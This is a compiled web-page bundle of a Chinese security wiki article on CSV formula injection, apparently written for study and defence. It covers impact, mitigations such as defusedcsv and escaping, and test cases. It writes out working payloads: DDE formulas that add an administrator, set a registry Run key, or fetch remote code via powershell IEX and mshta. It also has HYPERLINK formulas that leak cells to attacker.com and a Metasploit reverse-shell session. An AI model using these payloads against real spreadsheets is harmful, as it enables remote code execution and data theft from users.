loading="lazy">​</p><p>虽然微软默认关闭了 DDE 让执行外部命令有一些难度，但并不表示这个漏洞就无用武之地，毕竟公式是可以改变数据最终呈现的，比如上文提到的 HYPERLINK 能用来钓鱼、泄露信息，或者涉及金额计算的地方用来修改金额等。</p><p>这类漏洞通常出现在涉及导出数据的地方，比如<strong>导出日志</strong>、<strong>统计信息</strong>、<strong>配置信息</strong>等等位置。</p><h2 id="wps" tabindex="-1"><a class="header-anchor" href="#wps"><span>WPS</span></a></h2><ol><li><p>打开 WPS 公式编辑器，并选择要链接的单元格。</p></li><li><p>在公式编辑栏中输入“=”符号，然后输入“DDE(&quot;程序名称”，“服 务器名称”，“数据项””。</p><ol><li>程序名称：指的是链接的数据源程序名称，例如 Excel。</li><li>服务器名称：指的是数据源程序的文件名和路径。</li><li>数据项：指的是要链接的数据项，可以是单元格的数值、字符，或者其他数据类型。</li></ol></li><li><p>例如，<code>&quot;DDE(Excel，C:\\data.xlsx，Sheetl!A1)&quot;</code>​ 表示链接 Excel 文 件中 Sheet1 工作表的 A1 单元格数据。</p></li><li><p>按下回车键，完成动态链接。</p></li></ol><h1 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害"><span>漏洞危害</span></a></h1><h2 id="泄露敏感信息" tabindex="-1"><a class="header-anchor" href="#泄露敏感信息"><span>泄露敏感信息</span></a></h2>',28),L={href:"https://support.microsoft.com/zh-cn/office/hyperlink-%E5%87%BD%E6%95%B0-333c7ce6-c5ae-4164-9c47-7de9b76f577f",target:"_blank",rel:"noopener noreferrer"},D=(0,t.Fv)('<p>语法：<code>HYPERLINK(link_location, [friendly_name])</code>​</p><p>​<code>link_location</code>​ 的各种形式可以参看上面的官方示例。</p><p>其中很大的一方面是由于信任域的原因导致用户仍可能受到攻击，用户在 security.com 域下导出自己的 Guestbook.csv ，但由于恶意用户偷偷的在留言板中插入了恶意代码：</p><div class="language-c line-numbers-mode" data-ext="c" data-title="c"><pre class="language-c"><code><span class="token operator">=</span><span class="token function">HYPERLINK</span><span class="token punctuation">(</span><span class="token string">&quot;http://linux.im?test=&quot;</span><span class="token operator">&amp;</span>A2<span class="token operator">&amp;</span>A3<span class="token punctuation">,</span><span class="token string">&quot;Error: Please click me!&quot;</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这样就导致当用户在导出报表后倘若点击了某个单元格则会导致 A2,A3 的单元格内容泄露。</p><p>​<img src="'+o+'" alt="image" loading="lazy">​</p><p><strong>【实操】</strong></p><p>这样当用户在导出报表后，若点击这个单元格则会导致 A1 单元格的内容泄露。</p><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><p>​<img src="'+l+'" alt="image" loading="lazy">​</p><p>‍</p><hr><p><strong>【关于 python csv 库的问题】</strong></p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">import</span> csv\n\n<span class="token comment"># 定义数据</span>\ndata <span class="token operator">=</span> <span class="token punctuation">[</span>\n    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;=&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;=1+1&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>\n    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;-&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;-2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>\n    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;@&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;@2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>\n    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;+&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;+2+3&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>\n    <span class="token punctuation">{</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;hyperlink&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;=HYPERLINK(\\&quot;http://www.baidu.com/\\&quot;&amp;A1,\\&quot;click\\&quot;)&quot;</span><span class="token punctuation">}</span><span class="token punctuation">,</span>\n<span class="token punctuation">]</span>\n\n<span class="token comment"># 定义 CSV 文件路径</span>\ncsv_file <span class="token operator">=</span> <span class="token string">&quot;data_hyperlink.csv&quot;</span>\n\n<span class="token comment"># 写入 CSV 文件</span>\n<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>csv_file<span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">&#39;w&#39;</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>\n    writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictWriter<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> fieldnames<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;age&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>\n\n    <span class="token comment"># 写入标题</span>\n    writer<span class="token punctuation">.</span>writeheader<span class="token punctuation">(</span><span class="token punctuation">)</span>\n\n    <span class="token comment"># 写入数据</span>\n    <span class="token keyword">for</span> row <span class="token keyword">in</span> data<span class="token punctuation">:</span>\n        writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>row<span class="token punctuation">)</span>\n\n<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;CSV 文件已创建成功！&quot;</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+i+'" alt="image" loading="lazy">​</p><p>Excel 解析时会将两个双引号转义为单个双引号。</p><p>​<img src="'+u+'" alt="image" loading="lazy">​</p><p>​<img src="'+r+'" alt="image" loading="lazy">​</p><p>【<strong>关于全文信息泄露】</strong></p><p>之前使用 <code>&amp;A1&amp;A2&amp;A3&amp;A4</code>​ 窃取表单数据的方式看起来有点笨重，我找到了一种新的方法来更方便的窃取全文信息。</p>',20),S=(0,t.Lk)("p",null,"APPLIES TO: Excel 2016, Excel Online, Excel for Android tablets, Excel Mobile, Excel for Android phones, Less.",-1),B={href:"https://support.microsoft.com/en-us/office/concat-function-9b1a9a3f-94ff-41af-9736-694cbd6b4ca2?ui=en-us&rs=en-us&ad=us",target:"_blank",rel:"noopener noreferrer"},W=(0,t.Fv)('<p>2016 之前的 excel 和其他的版本的连接字符串的函数 concatenate 不支持 cell range 的语法，也不能自定义函数，这样的话就没有办法简写，只能生成比较长的 url。但 2016 之后的 excel 我们可以使用 concat 函数，支持传入一个 range，比如 <code>concat(A1:A10)</code>​ ，这样便能直接读取整个表格中的数据。</p><h2 id="rce-钓鱼" tabindex="-1"><a class="header-anchor" href="#rce-钓鱼"><span>RCE 钓鱼</span></a></h2><p>利用 DDE 注入，远程命令执行。在单元格中输入 <code>1+cmd|&#39;/C calc&#39;!A0</code>​，回车后 Excel 会弹出一个框，提醒 Excel 需要启动另外一个程序（cmd）,点击是，Windows 会弹出计算器窗口。</p><p>​<img src="'+d+'" alt="image" loading="lazy">​</p><ul><li><p>老版本比如说：office 2016 默认开启。</p></li><li><p>新版本要手动打开：文件 -- 选项 -- 信任中心 -- 信任中心设置 -- 外部内容 -- 启用动态数据交换服务器启动</p></li></ul><p>​<img src="'+k+'" alt="image" loading="lazy">​</p><p>​<img src="'+m+'" alt="image" loading="lazy">​</p><p>测试了一下 <code>@</code>​ 失败了，其余成功。</p><p>​<img src="'+g+'" alt="image" loading="lazy">​</p><hr><p><strong>【其他 payload】</strong></p><p>导出 xlsx 文件与 CSV 注入类似，也存在类似的问题，因为都是利用 Excel 公式语法执行系统命令。</p><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment"># 添加用户</span>\n<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/C net user test 123456/add&#39;</span>!A0<span class="token operator">+</span><span class="token operator">&lt;</span>br<span class="token operator">&gt;=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/C net user test 123456/add &amp;&amp; net localgroup administrators test /add&#39;</span>!A0\n\n<span class="token comment"># 修改注册表</span>\n<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/C reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v calc /t REG_SZ /d c:\\windows\\system32\\calc.exe /f&#39;</span>!A0\n\n<span class="token comment"># RCE</span>\n<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39; /C calc&#39;</span>!A0\n<span class="token operator">+</span>cmd<span class="token operator">|</span><span class="token string">&#39; /C calc&#39;</span>!A0\n<span class="token operator">-</span>cmd<span class="token operator">|</span><span class="token string">&#39; /C calc&#39;</span>!A0\n<span class="token decorator annotation punctuation">@SUM</span><span class="token punctuation">(</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c calc&#39;</span>!A0<span class="token punctuation">)</span>\n\n<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/C powershell IEX(wget attacker_server/shell.exe)&#39;</span>!A0\n<span class="token operator">=</span>cmd<span class="token operator">|</span><span class="token string">&#39;/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0&#39;</span>!_xlbgnm<span class="token punctuation">.</span>A1\n<span class="token operator">=</span><span class="token number">10</span><span class="token operator">+</span><span class="token number">20</span><span class="token operator">+</span>cmd<span class="token operator">|</span><span class="token string">&#39; /C calc&#39;</span>!A0\n<span class="token decorator annotation punctuation">@SUM</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token operator">*</span>cmd<span class="token operator">|</span><span class="token string">&#39; /C calc&#39;</span>!A0\n\n<span class="token comment"># 信息泄漏</span>\n<span class="token operator">=</span>HYPERLINK<span class="token punctuation">(</span><span class="token string">&quot;http://attacker.com/?param1=value1&amp;param2=&quot;</span><span class="token operator">&amp;</span>A1<span class="token operator">&amp;</span><span class="token string">&quot;@attacker.com&quot;</span><span class="token punctuation">)</span>\n\n<span class="token comment"># ======== 修复库的测试 payload</span>\n<span class="token decorator annotation punctuation">@pytest<span class="token punctuation">.</span>mark<span class="token punctuation">.</span>parametrize</span><span class="token punctuation">(</span><span class="token string">&quot;input,expected&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>\n    <span class="token comment"># Sample dangerous payloads</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;=1+1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;=1+1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;-1+1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;-1+1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;+1+1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;+1+1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;=1+1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;=1+1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;@A3&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;@A3&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;%1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;%1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;|1+1&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;\\\\|1+1&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;=1|2&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;=1\\\\|2&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token comment"># https://blog.zsec.uk/csv-dangers-mitigations/</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;=cmd|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;=cmd\\\\|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;=cmd|&#39; /C powershell IEX(wget 0r.pe/p)&#39;!A0&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;=cmd\\\\|&#39; /C powershell IEX(wget 0r.pe/p)&#39;!A0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;@SUM(1+1)*cmd|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;@SUM(1+1)*cmd\\\\|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;@SUM(1+1)*cmd|&#39; /C powershell IEX(wget 0r.pe/p)&#39;!A0&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;@SUM(1+1)*cmd\\\\|&#39; /C powershell IEX(wget 0r.pe/p)&#39;!A0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token comment"># https://hackerone.com/reports/72785</span>\n    <span class="token punctuation">(</span><span class="token string">&quot;-2+3+cmd|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&#39;-2+3+cmd\\\\|&#39; /C calc&#39;!A0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n    <span class="token comment"># https://web.archive.org/web/20220516052229/https://www.contextis.com/us/blog/comma-separated-vulnerabilities</span>\n    <span class="token punctuation">(</span><span class="token string">&#39;=HYPERLINK(&quot;http://contextis.co.uk?leak=&quot;&amp;A1&amp;A2,&quot;Error: please click for further information&quot;)&#39;</span><span class="token punctuation">,</span>\n     <span class="token string">&#39;\\&#39;=HYPERLINK(&quot;http://contextis.co.uk?leak=&quot;&amp;A1&amp;A2,&quot;Error: please click for further information&quot;)&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>\n\n<span class="token punctuation">]</span><span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="msf" tabindex="-1"><a class="header-anchor" href="#msf"><span>MSF</span></a></h2><div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token comment"># 利用 MSF 框架反弹 shell，使用 office_word_hta 模块去反弹 shell</span>\nmsf6 <span class="token operator">&gt;</span> use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>misc<span class="token operator">/</span>hta_server\n<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> No payload configured<span class="token punctuation">,</span> defaulting to windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp\nmsf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>misc<span class="token operator">/</span>hta_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin">set</span> srvhost <span class="token number">192.168</span><span class="token number">.202</span><span class="token number">.61</span>\nsrvhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span><span class="token number">.202</span><span class="token number">.61</span>\nmsf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>misc<span class="token operator">/</span>hta_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit\n<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Exploit running <span class="token keyword">as</span> background job <span class="token number">0.</span>\n<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Exploit completed<span class="token punctuation">,</span> but no session was created<span class="token punctuation">.</span>\n\n<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span><span class="token number">.202</span><span class="token number">.61</span><span class="token punctuation">:</span><span class="token number">4444</span> \n<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Using URL<span class="token punctuation">:</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token number">.202</span><span class="token number">.61</span><span class="token punctuation">:</span><span class="token number">8080</span><span class="token operator">/</span>JO9CGVsbSAKZKYC<span class="token punctuation">.</span>hta\nmsf6 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>misc<span class="token operator">/</span>hta_server<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Server started<span class="token punctuation">.</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后将在 EXCEL 中插入恶意载荷</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>+1+cmd<span class="token operator">|</span><span class="token string">&#39;/c mshta.exe http://192.168.202.61:8080/JO9CGVsbSAKZKYC.hta&#39;</span><span class="token operator">!</span>A0\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h1 id="漏洞防范" tabindex="-1"><a class="header-anchor" href="#漏洞防范"><span>漏洞防范</span></a></h1>',18),z=(0,t.Lk)("li",null,[(0,t.Lk)("p",null,"根据业务场景来严格限制输入格式，比如填 URI 的地方判断 URI 格式是否正确；")],-1),Q={href:"https://github.com/raphaelm/defusedcsv",target:"_blank",rel:"noopener noreferrer"},P=(0,t.Lk)("code",null,",",-1),H=(0,t.Lk)("code",null,";",-1),j=(0,t.Lk)("code",null,"'",-1),N=(0,t.Lk)("code",null,'"',-1),M=(0,t.Lk)("strong",null,"因为攻击者可以使用它来启动一个新单元格",-1),F={href:"https://owasp.org/www-community/attacks/CSV_Injection",target:"_blank",rel:"noopener noreferrer"},O=(0,t.Lk)("ol",null,[(0,t.Lk)("li",null,"将每个单元格字段用双引号引起来"),(0,t.Lk)("li",null,"在每个单元格字段前面加上单引号"),(0,t.Lk)("li",null,"使用额外的双引号转义每个双引号")],-1),V=(0,t.Lk)("li",null,[(0,t.Lk)("p",null,[(0,t.eW)("问题在于管道 ("),(0,t.Lk)("code",null,"|"),(0,t.eW)("​​) 字符，Excel 和其他应用程序解释该字符以执行 "),(0,t.Lk)("code",null,"{arbitrary}"),(0,t.eW)("​​ 命令并从这些有效负载向量启动 Windows 二进制文件。通过阅读有关攻击的内容并研究可能的缓解技术，我发现最好的解决方法是在这种攻击场景中转义管道字符，即在管道之前添加 "),(0,t.Lk)("code",null,"\\"),(0,t.eW)("​​ 。")])],-1),X=(0,t.Fv)('<div class="language-python line-numbers-mode" data-ext="py" data-title="py"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">escape</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>\n     <span class="token keyword">if</span> payload<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">&#39;@&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;+&#39;</span><span class="token punctuation">,</span><span class="token string">&#39;-&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;=&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;|&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;%&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>\n             payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&quot;|&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;\\|&quot;</span><span class="token punctuation">)</span>\n             payload <span class="token operator">=</span> <span class="token string">&quot;&#39;&quot;</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">&quot;&#39;&quot;</span>\n     <span class="token keyword">return</span> payload\n\n<span class="token comment"># An example of payload string</span>\npayload <span class="token operator">=</span> <span class="token string">&quot;@cmd|&#39; /C calc&#39;!A0&quot;</span>\n<span class="token keyword">print</span> <span class="token string">&quot;The Unescaped version is: &quot;</span> <span class="token operator">+</span>  payload\n<span class="token keyword">print</span> <span class="token string">&quot;When passed though escape function the value is: &quot;</span> <span class="token operator">+</span> escape<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="5"><li>来自 Microsoft 的提示</li></ol><p>​<img src="'+v+'" alt="image" loading="lazy">​</p><h1 id="前人栽树" tabindex="-1"><a class="header-anchor" href="#前人栽树"><span>前人栽树</span></a></h1>',4),I={href:"https://owasp.org/www-community/attacks/CSV_Injection",target:"_blank",rel:"noopener noreferrer"},Y={href:"https://blog.zsec.uk/csv-dangers-mitigations/",target:"_blank",rel:"noopener noreferrer"},U={href:"https://www.thedailybeast.com/this-is-how-cops-trick-dark-web-drug-dealers-into-unmasking-themselves",target:"_blank",rel:"noopener noreferrer"},T={href:"https://www.shellcodes.org/Hacking/%E5%85%AC%E5%BC%8F%E6%B3%A8%E5%85%A5%EF%BC%88Formula%20Injection%EF%BC%89%E6%94%BB%E5%87%BB.html",target:"_blank",rel:"noopener noreferrer"},G={href:"https://shuhari.dev/blog/2019/10/csv-explained",target:"_blank",rel:"noopener noreferrer"},K=(0,t.Fv)('<h1 id="csv-injection-实例" tabindex="-1"><a class="header-anchor" href="#csv-injection-实例"><span>CSV Injection 实例</span></a></h1><h2 id="环境条件" tabindex="-1"><a class="header-anchor" href="#环境条件"><span>环境条件</span></a></h2><blockquote><p>“由于 csv 并没有通用标准，而 excel 在没有任何标准的前提下把数据中的第一个等号解释为方程，导致了安全问题。”-- 特性</p></blockquote><p>解决方案完全只是为了适配 excel，在适配 excel 的同时，不可能适配其它应用（因为没有统一的标准）”</p><p>因此必然无可避免的副作用就是，如果不是用 excel 来打开，比如使用导入工具把 csv 直接导入到 mysql 数据库，则数据 <code>=X</code>​ 导入到 mysql 后，会变成 <code>=&quot;=X&quot;</code>​。</p><h2 id="漏洞挖掘-1" tabindex="-1"><a class="header-anchor" href="#漏洞挖掘-1"><span>漏洞挖掘</span></a></h2><p>这个是一个<strong>截断</strong>的实例，该程序会给 <code>=、+、-、@</code>​​ 开头的单元格内容添加 <code>=&quot;&quot;</code>​​，即强制引号 <code>&quot;</code>​​ 输出的同时，添加一个额外的 <code>=</code>​​ 前缀来适配 excel。</p><hr><p>payload：</p><p>​<code>=HYPERLINK(&quot;http://baidu.com&quot;,&quot;=cmd|&#39;/C calc&#39;!A0)</code>​</p><p>导出后变成了</p><p>​<code>=&quot;=HYPERLINK(&quot;&quot;http://baidu.com&quot;&quot;,&quot;&quot;=cmd|&#39;/C calc&#39;!A0&quot;</code>​</p><p>这样就导致 cmd 前面的引号 <code>&quot;</code>​ 和第一个引号闭合了，所以后面 <code>=cmd|&#39;/C calc&#39;!A0&quot;</code>​ 就被写到了新的单元格，导致的引号逃逸。</p><p>​<img src="'+b+'" alt="image" loading="lazy">​</p><h1 id="" tabindex="-1"><a class="header-anchor" href="#"><span></span></a></h1>',15),Z={},J=(0,a(7708).A)(Z,[["render",function(n,s){const a=(0,t.g2)("ExternalLinkIcon");return(0,t.uX)(),(0,t.CE)("div",null,[h,(0,t.Lk)("p",null,[(0,t.Lk)("strong",null,[(0,t.Lk)("a",A,[(0,t.eW)("CSV Wiki"),(0,t.bF)(a)])])]),q,f,(0,t.Lk)("p",null,[(0,t.eW)("CSV 文件的格式不存在通用标准，也没有指定所使用的字符编码，但是在 "),(0,t.Lk)("a",w,[(0,t.eW)("RFC 4180"),(0,t.bF)(a)]),(0,t.eW)(" 中有基础性的描述， 而 7-bit ASCII 是最基本的通用编码。")]),C,x,(0,t.Lk)("blockquote",null,[(0,t.Lk)("p",null,[(0,t.eW)("CSV Injection is an attack technique first discovered by Context Information Security in "),(0,t.Lk)("a",E,[(0,t.eW)("2014"),(0,t.bF)(a)]),(0,t.eW)(".")])]),y,(0,t.Lk)("p",null,[(0,t.Lk)("a",L,[(0,t.eW)("HYPERLINK 函数 - Microsoft 支持"),(0,t.bF)(a)])]),D,(0,t.Lk)("blockquote",null,[S,(0,t.Lk)("p",null,[(0,t.Lk)("a",B,[(0,t.eW)("CONCAT function - Microsoft Support"),(0,t.bF)(a)])])]),W,(0,t.Lk)("ol",null,[z,(0,t.Lk)("li",null,[(0,t.Lk)("p",null,[(0,t.eW)("生成表格文件时，凡是公式字符开头（=、+、-、@）数据，可以添加单引号在首部来阻止被解析。Python 已经有开源的库帮我们写好了此逻辑，可以直接引入使用，详情见 "),(0,t.Lk)("a",Q,[(0,t.eW)("GitHub - raphaelm/defusedcsv: Python library to protect your users from Excel injections in CSV-format exports, drop-in replacement for standard library's csv module"),(0,t.bF)(a)]),(0,t.eW)("。")])]),(0,t.Lk)("li",null,[(0,t.Lk)("p",null,[(0,t.eW)("请记住，仅确保不受信任的用户输入不以这些字符开头是不够的。您还需要注意字段分隔符（例如，“ "),P,(0,t.eW)("​​​ ”或“ "),H,(0,t.eW)("​​​ ”）和引号（例如， "),j,(0,t.eW)("​​​ 或 "),N,(0,t.eW)("​​​ ），"),M,(0,t.eW)("，然后在用户输入的中间但在单元格的开头放置危险字符。"),(0,t.Lk)("a",F,[(0,t.eW)("CSV Injection | OWASP Foundation"),(0,t.bF)(a)])]),O]),V]),X,(0,t.Lk)("ul",null,[(0,t.Lk)("li",null,[(0,t.Lk)("p",null,[(0,t.Lk)("a",I,[(0,t.eW)("CSV Injection | OWASP Foundation"),(0,t.bF)(a)])])]),(0,t.Lk)("li",null,[(0,t.Lk)("p",null,[(0,t.Lk)("a",Y,[(0,t.eW)("CSV Injection Mitigations & Dangers (zsec.uk)"),(0,t.bF)(a)]),(0,t.eW)(" -- 很优秀的一个 blog")])]),(0,t.Lk)("li",null,[(0,t.Lk)("p",null,[(0,t.Lk)("a",U,[(0,t.eW)("《This Is How Cops Trick Dark-Web Criminals Into Unmasking Themselves》"),(0,t.bF)(a)]),(0,t.eW)("，这篇文章讲述了 FBI 利用这种技巧来跟踪罪犯。")]),(0,t.Lk)("p",null,[(0,t.Lk)("a",T,[(0,t.eW)("公式注入（Formula Injection）攻击 (shellcodes.org)"),(0,t.bF)(a)])])]),(0,t.Lk)("li",null,[(0,t.Lk)("p",null,[(0,t.Lk)("a",G,[(0,t.eW)("说透 CSV 格式 - SHUHARI 的博客"),(0,t.bF)(a)])])])]),K])}]]),R=JSON.parse('{"path":"/websec/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/CSV%20%E6%B3%A8%E5%85%A5.html","title":"CSV 注入","lang":"zh-CN","frontmatter":{"title":"CSV 注入","description":"CSV 概述 CSV Wiki 逗号分隔值（Comma-Separated Values，CSV，有时也称为字符分隔值，因为分隔字符也可以不是逗号），其文件以纯文本形式存储表格数据（数字和文本）。纯文本意味着该文件是一个字符 \\"字符 (计算机科学)\\")序列，不含必须像二进制数字那样被解读的数据。 CSV 